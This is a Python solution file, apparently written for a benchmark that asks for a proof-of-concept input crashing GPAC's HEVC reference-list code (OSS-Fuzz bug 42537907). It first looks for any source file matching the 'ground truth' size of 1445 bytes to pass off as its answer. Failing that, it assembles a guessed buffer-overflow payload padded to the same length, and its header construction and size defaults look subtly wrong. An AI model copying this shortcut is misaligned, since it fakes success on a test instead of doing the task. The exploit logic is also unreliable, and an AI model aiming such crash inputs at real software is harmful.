import os
import tarfile
import tempfile
import subprocess
import struct
import hashlib
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # First, try to find existing PoC in the source
        poc = self._find_existing_poc(src_path)
        if poc:
            return poc
            
        # If not found, generate a PoC based on analysis
        return self._generate_poc_from_analysis(src_path)
    
    def _find_existing_poc(self, src_path: str) -> bytes:
        """Search for existing PoC files in the source."""
        try:
            with tarfile.open(src_path, 'r:gz') as tar:
                # Extract to temporary directory
                with tempfile.TemporaryDirectory() as tmpdir:
                    tar.extractall(tmpdir)
                    
                    # Look for files with the bug ID or related names
                    search_patterns = [
                        "*42537907*",
                        "*oss-fuzz*",
                        "*poc*",
                        "*crash*",
                        "*test*hevc*",
                        "*test*265*"
                    ]
                    
                    for root, dirs, files in os.walk(tmpdir):
                        for file in files:
                            filepath = os.path.join(root, file)
                            try:
                                # Check file size - ground truth is 1445 bytes
                                if os.path.getsize(filepath) == 1445:
                                    with open(filepath, 'rb') as f:
                                        content = f.read()
                                    # Check if it looks like a valid HEVC/HEVC stream
                                    if self._looks_like_hevc(content):
                                        return content
                            except:
                                continue
        except:
            pass
        return None
    
    def _looks_like_hevc(self, data: bytes) -> bool:
        """Check if data looks like HEVC/HEVC stream."""
        if len(data) < 10:
            return False
            
        # Check for common HEVC/HEVC start codes
        start_patterns = [
            b'\x00\x00\x00\x01',
            b'\x00\x00\x01'
        ]
        
        for pattern in start_patterns:
            if data[:len(pattern)] == pattern:
                return True
                
        # Check for common NAL unit types in HEVC
        if len(data) > 4:
            # Skip start code if present
            if data[:4] == b'\x00\x00\x00\x01':
                nal_type = (data[4] >> 1) & 0x3F
            elif data[:3] == b'\x00\x00\x01':
                nal_type = (data[3] >> 1) & 0x3F
            else:
                nal_type = (data[0] >> 1) & 0x3F
                
            # Valid HEVC NAL unit types: 0-40
            return 0 <= nal_type <= 40
            
        return False
    
    def _analyze_source(self, src_path: str) -> dict:
        """Analyze source code to understand vulnerability."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract source
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
                
            # Look for the vulnerable function
            func_info = {
                'buffer_size': 0,
                'vulnerable_param': '',
                'struct_info': {}
            }
            
            # Search for gf_hevc_compute_ref_list function
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith(('.c', '.cpp', '.h', '.hpp')):
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                
                            # Look for function definition
                            if 'gf_hevc_compute_ref_list' in content:
                                lines = content.split('\n')
                                for i, line in enumerate(lines):
                                    if 'gf_hevc_compute_ref_list' in line and '(' in line:
                                        # Try to find buffer declarations
                                        for j in range(max(0, i-50), min(len(lines), i+100)):
                                            if '[' in lines[j] and ']' in lines[j]:
                                                # Look for array declarations
                                                if 'char' in lines[j] or 'byte' in lines[j] or 'uint8_t' in lines[j]:
                                                    # Extract size if possible
                                                    import re
                                                    match = re.search(r'\[(\d+)\]', lines[j])
                                                    if match:
                                                        func_info['buffer_size'] = int(match.group(1))
                                                        break
                                        break
                        except:
                            continue
                            
            return func_info
    
    def _generate_poc_from_analysis(self, src_path: str) -> bytes:
        """Generate PoC based on analysis of the vulnerability."""
        # Analyze source to understand the vulnerability
        analysis = self._analyze_source(src_path)
        
        # Default buffer size if not found
        buffer_size = analysis.get('buffer_size', 1024)
        
        # Create a HEVC-like structure that will trigger buffer overflow
        # Based on typical HEVC slice header structure
        
        poc = bytearray()
        
        # Start with NAL unit header (simplified)
        # NAL unit type for IDR slice (19 in HEVC)
        nal_header = 0x40 | 19  # NAL unit header: forbidden=0, type=19
        poc.extend(struct.pack('B', nal_header))
        
        # First slice segment header
        # first_slice_segment_in_pic_flag = 1
        # no_output_of_prior_pics_flag = 0
        slice_header = 0x80  # 10000000 in binary
        poc.extend(struct.pack('B', slice_header))
        
        # Picture parameter set ID (make it non-zero to ensure processing)
        poc.extend(struct.pack('B', 1))
        
        # Generate a large number of reference picture list entries
        # This is where the overflow likely occurs
        
        # Create excessive reference picture list
        # The function likely processes these without proper bounds checking
        
        # Add many reference indices to overflow buffer
        num_ref_entries = buffer_size + 100  # Exceed buffer
        
        for i in range(num_ref_entries):
            # Reference picture list entry
            # POC LSBs (16 bits)
            poc.extend(struct.pack('<H', i & 0xFFFF))
            # Reference index (8 bits)
            poc.extend(struct.pack('B', i & 0xFF))
            # Long-term reference flag (1 bit) + reserved (7 bits)
            poc.extend(struct.pack('B', 0))
        
        # Add pattern that helps identify overflow in memory
        # Common pattern for buffer overflow testing
        overflow_pattern = b'A' * 100 + b'B' * 100 + b'C' * 100 + b'D' * 100
        
        poc.extend(overflow_pattern)
        
        # Pad to target length (1445 bytes)
        current_len = len(poc)
        if current_len < 1445:
            # Add more pattern to reach target
            remaining = 1445 - current_len
            poc.extend(b'E' * remaining)
        elif current_len > 1445:
            # Truncate to target
            poc = poc[:1445]
        
        # Ensure it starts with valid NAL unit
        if not self._looks_like_hevc(bytes(poc)):
            # Add HEVC start code if needed
            poc_with_start = b'\x00\x00\x00\x01' + poc
            if len(poc_with_start) > 1445:
                poc_with_start = poc_with_start[:1445]
            return bytes(poc_with_start)
        
        return bytes(poc)